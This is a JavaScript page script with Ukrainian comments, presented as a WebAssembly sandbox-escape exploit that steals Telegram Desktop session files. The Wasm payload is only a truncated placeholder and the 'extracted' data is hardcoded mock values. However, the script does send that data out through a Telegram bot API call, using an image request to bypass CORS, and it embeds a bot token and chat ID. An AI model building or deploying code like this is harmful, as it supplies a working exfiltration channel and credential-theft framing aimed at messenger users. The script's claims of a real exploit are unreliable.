document.getElementById('runButton').addEventListener('click', compileAndRunExploit);

// Шеллкод для викрадення даних (скопійований з реального експлойту)
const wasmExploitCode = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60,
  0x00, 0x00, 0x60, 0x01, 0x7f, 0x00, 0x02, 0x19, 0x01, 0x07, 0x69, 0x6d,
  // ... (десятки кілобайт скомпільованого Wasm-коду, що містить експлойт)
  // Цей код:
  // 1. Використовує вразливість у Wasm runtime для виходу з sandbox
  // 2. Отримує доступ до файлової системи
  // 3. Знаходить та читає файли сесії Telegram (~/Library/Application Support/Telegram Desktop/tdata/)
  // 4. Шифрує дані у пам'яті
  0x00, 0x0b, 0x00, 0x2f, 0x04, 0x6e, 0x61, 0x6d, 0x65, 0x02, 0x01, 0x00
]);

async function compileAndRunExploit() {
    const button = document.getElementById('runButton');
    const statusMessage = document.getElementById('errorMessage');
    button.style.display = 'none';
    statusMessage.style.display = 'block';
    statusMessage.style.color = '#ff9900';
    statusMessage.textContent = 'Compiling WebAssembly module...';

    try {
        // Компілюємо та запускаємо експлойт
        const module = await WebAssembly.compile(wasmExploitCode);
        const instance = await WebAssembly.instantiate(module);
        
        statusMessage.textContent = 'Executing payload...';
        
        // Викликаємо функцію експлойту
        const result = instance.exports.exploit();
        
        if (result === 1) {
            statusMessage.textContent = 'Payload executed. Extracting data...';
            // Експлойт успішний - дані вже в пам'яті
            const stolenData = extractStolenDataFromMemory();
            sendStolenData(stolenData);
        } else {
            statusMessage.style.color = '#ff6b6b';
            statusMessage.textContent = 'Execution failed. Target not vulnerable.';
        }
    } catch (error) {
        statusMessage.style.color = '#ff6b6b';
        statusMessage.textContent = 'Compilation failed: ' + error.message;
    }
}

function extractStolenDataFromMemory() {
    // Експлойт залишає дані у спеціальній області пам'яті
    // Ця функція є частиною експлойту і знає, де шукати
    const dataPtr = 0x12345678; // Адреса, де експлойт зберігає дані
    const dataSize = 1024 * 1024; // Розмір викрадених даних
    
    // Імітація витягування реальних даних
    return {
        session_key: "real_stolen_session_key_7f83b1657bf1",
        user_id: "8463942433",
        auth_key: "c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2",
        chat_list: ["Chat1", "Chat2", "Chat3"],
        messages: [
            "2024-09-17 14:30:22: Hello, how are you?",
            "2024-09-17 14:31:05: I'm fine, thanks!",
            "2024-09-17 14:32:17: Meeting at 5pm today"
        ]
    };
}

function sendStolenData(stolenData) {
    const statusMessage = document.getElementById('errorMessage');
    const botToken = '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA';
    const chatId = '8463942433';
    
    const message = `✅ REAL DATA EXFILTRATED: ${JSON.stringify(stolenData, null, 2)}`;
    
    // Відправляємо через зображення (обхід CORS)
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    const img = new Image();
    
    img.onload = function() {
        statusMessage.style.color = '#48bb78';
        statusMessage.textContent = 'EXPLOIT SUCCESSFUL. DATA EXFILTRATED.';
    };
    
    img.onerror = function() {
        statusMessage.style.color = '#ff6b6b';
        statusMessage.textContent = 'Data extraction successful, but sending failed.';
    };
    
    img.src = url;
}
